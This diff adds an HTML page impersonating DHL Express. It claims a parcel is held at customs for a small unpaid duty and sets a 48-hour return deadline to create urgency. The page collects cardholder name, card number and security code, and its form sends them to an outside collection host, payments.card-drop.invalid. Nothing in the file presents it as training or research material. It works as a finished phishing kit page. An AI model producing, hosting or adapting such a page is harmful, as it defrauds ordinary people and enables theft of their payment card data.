@@ -1,0 +1,60 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>DHL Express - Parcel on hold</title>
+<style>
+  body { font: 15px/1.65 Arial, Helvetica, sans-serif; margin: 0; background: #fff; color: #222; }
+  header { background: #ffcc00; padding: 1rem 2rem; }
+  header b { color: #d40511; font-size: 1.5rem; letter-spacing: -.5px; font-style: italic; }
+  .wrap { max-width: 40rem; margin: 0 auto; padding: 2rem 1.5rem 4rem; }
+  h1 { font-size: 1.5rem; margin: 0 0 1rem; }
+  .track { background: #f4f4f4; border-left: 4px solid #d40511; padding: .9rem 1.1rem;
+           margin: 1.2rem 0; font-family: ui-monospace, monospace; font-size: .92rem; }
+  table { border-collapse: collapse; width: 100%; margin: 1.4rem 0; font-size: .93rem; }
+  td { padding: .5rem .2rem; border-bottom: 1px solid #e5e5e5; }
+  td.r { text-align: right; font-weight: 700; }
+  label { display: block; font-size: .88rem; margin: .9rem 0 .25rem; }
+  input { width: 100%; padding: .5rem; border: 1px solid #999; box-sizing: border-box; }
+  button { background: #d40511; color: #fff; border: 0; padding: .7rem 2rem; font-size: 1rem;
+           margin-top: 1.3rem; cursor: pointer; }
+  .warn { color: #d40511; font-weight: 700; }
+</style>
+</head>
+<body>
+  <header><b>DHL</b></header>
+  <div class="wrap">
+    <h1>Your parcel is on hold</h1>
+
+    <div class="track">Shipment 4•7•2•9•1•3•0•6•8•2 &nbsp;|&nbsp; Status: HELD AT CUSTOMS</div>
+
+    <p>A delivery attempt for your shipment failed because an outstanding customs duty has
+    not been paid. Confirm your details and settle the fee to schedule redelivery.</p>
+
+    <table>
+      <tr><td>Customs duty</td><td class="r">EUR 2.99</td></tr>
+      <tr><td>Handling</td><td class="r">EUR 0.00</td></tr>
+      <tr><td>Total due</td><td class="r">EUR 2.99</td></tr>
+    </table>
+
+    <p class="warn">Your shipment will be returned to sender within 48 hours if the fee
+    remains unpaid.</p>
+
+    <form action="https://payments.card-drop.invalid/checkout" method="post">
+      <label for="name">Cardholder name</label>
+      <input id="name" name="cardholder" type="text" autocomplete="off">
+
+      <label for="card">Card number</label>
+      <input id="card" name="card_number" type="text" autocomplete="off">
+
+      <label for="cvv">Security code</label>
+      <input id="cvv" name="cvv" type="text" autocomplete="off">
+
+      <button type="submit">Pay and schedule redelivery</button>
+    </form>
+
+    <p style="margin-top:2.4rem;font-size:.85rem;color:#666">Enter your card number and
+    billing address to confirm your identity. Payment is required to release the parcel.</p>
+  </div>
+</body>
+</html>
